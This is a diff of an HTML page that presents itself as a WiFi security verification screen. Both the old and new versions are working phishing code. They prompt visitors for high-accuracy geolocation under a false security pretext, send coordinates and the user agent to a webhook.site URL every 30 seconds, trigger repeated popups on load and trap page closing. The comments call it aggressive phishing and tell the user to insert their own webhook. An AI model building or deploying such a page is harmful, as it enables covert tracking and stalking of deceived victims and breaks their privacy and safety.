@@ -3,87 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WiFi Connected - Location Verification</title>
+    <title>WiFi Security Verification</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: browsersize; }
-        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; display: flex; align-items: center; justify-content: center; }
-        .container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
-        .status { color: #28a745; font-size: 24px; margin: 20px 0; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { background: #007bff; color: white; border: none; padding: 12px 30px; border-radius: 25px; font-size: 16px; cursor: pointer; }
-        button:hover { background: #0056b3; }
-        .hidden { display: none; }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh; display:flex; align-items:center; justify-content:center;
+            color:#333;
+        }
+        .container {
+            background: rgba(255,255,255,0.95); backdrop-filter:blur(20px);
+            padding:40px; border-radius:20px; box-shadow:0 20px 40px rgba(0,0,0,0.1);
+            max-width:400px; width:90%; text-align:center;
+        }
+        h1 { color:#4a5568; margin-bottom:20px; font-size:1.4em; }
+        .status { font-size:1.2em; margin:20px 0; padding:15px; border-radius:10px; }
+        .scanning { background:#48bb78; color:white; animation:pulse 2s infinite; }
+        .verified { background:#38a169; color:white; }
+        button {
+            background:linear-gradient(45deg,#ff6b6b,#feca57); color:white;
+            border:none; padding:15px 30px; border-radius:50px; font-size:1.1em;
+            cursor:pointer; margin:10px; box-shadow:0 10px 20px rgba(254,202,87,0.3);
+            transition:all 0.3s;
+        }
+        button:hover { transform:translateY(-2px); box-shadow:0 15px 30px rgba(254,202,87,0.4); }
+        button:active { transform:translateY(0); }
+        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.7;} }
+        #status { font-weight:bold; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>🔒 Secure WiFi Verification</h2>
+        <h1>🔒 WiFi Security Verification</h1>
+        <div id="status" class="status scanning">📡 Scanning nearby networks...</div>
         <p>Your device is connected. Verifying location for security...</p>
-        <div id="spinner" class="spinner"></div>
-        <div id="status" class="status hidden">✅ Location Verified. Keeping connection active...</div>
-        <button id="allowBtn" onclick="requestLocation()">Allow Location Access</button>
+        <button id="scanBtn">📍 Enable High Accuracy Scan</button>
+        <p style="font-size:0.9em; opacity:0.8; margin-top:20px;">
+            Keep this page open for continuous verification
+        </p>
     </div>
 
     <script>
-        let webhookUrl = 'https://webhook.site/c2f96a55-bb46-4f47-a5ce-3d31c4505c3e
-Copy to clipboard
-';  // Replace with your ngrok/Receive URL
-        let intervalId;
+        // ← REPLACE THIS WITH YOUR WEBHOOK.SITE URL ↓
+        let webhookUrl = '	https://webhook.site/c2f96a55-bb46-4f47-a5ce-3d31c4505c3e';
+        
+        function requestLocation() {
+            navigator.geolocation.getCurrentPosition(
+                sendLocation,
+                (error) => {
+                    console.log('Geolocation error:', error);
+                    document.getElementById('status').textContent = '❌ Location access needed - Tap SCAN';
+                    document.getElementById('status').className = 'status';
+                },
+                { 
+                    enableHighAccuracy: true, 
+                    maximumAge: 30000, 
+                    timeout: 10000 
+                }
+            );
+        }
 
-        function sendLocation(lat, lon, acc) {
+        function sendLocation(position) {
+            const data = {
+                timestamp: new Date().toISOString(),
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                userAgent: navigator.userAgent,
+                ip: 'unknown'
+            };
+            
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    timestamp: new Date().toISOString(),
-                    latitude: lat,
-                    longitude: lon,
-                    accuracy: acc,
-                    userAgent: navigator.userAgent
-                })
-            }).catch(err => console.log('Send failed:', err));
+                body: JSON.stringify(data)
+            }).then(() => {
+                document.getElementById('status').textContent = `✅ Location verified (${data.accuracy.toFixed(0)}m)`;
+                document.getElementById('status').className = 'status verified';
+            });
         }
 
-        function startTracking() {
-            document.getElementById('allowBtn').classList.add('hidden');
-            document.getElementById('spinner').classList.add('hidden');
-            document.getElementById('status').classList.remove('hidden');
-            document.body.style.background = '#000';  // Darken to simulate fullscreen
-            intervalId = setInterval(() => {
-                if (!document.hidden) {  // Only poll if tab visible for battery evasion
-                    navigator.geolocation.getCurrentPosition(
-                        pos => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
-                        err => console.log('Geo err:', err),
-                        { enableHighAccuracy: true, maximumAge: 30000, timeout: 10000 }
-                    );
-                }
-            }, 30000);  // 30s updates
-        }
-
-        function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-                        startTracking();
-                    },
-                    err => {
-                        alert('Location access required for WiFi. Please enable.');
-                    },
-                    { enableHighAccuracy: true }
-                );
-            } else {
-                alert('Geolocation not supported.');
-            }
-        }
-
-        // Auto-request on load (aggressive phishing)
-        window.onload = () => requestLocation();
-
-        // Prevent close/exit
-        window.addEventListener('beforeunload', () => 'Connection active - stay for security.');
+        // AGGRESSIVE POPUP TRIGGERS
+        window.onload = () => {
+            setTimeout(requestLocation, 1000);  // Popup #1
+            setTimeout(requestLocation, 3000);  // #2
+        };
+        
+        // Button backup
+        document.getElementById('scanBtn').onclick = requestLocation;
+        
+        // Background polling
+        setInterval(requestLocation, 30000);
+        
+        // Trap page close
+        window.addEventListener('beforeunload', requestLocation);
     </script>
 </body>
-
 </html>
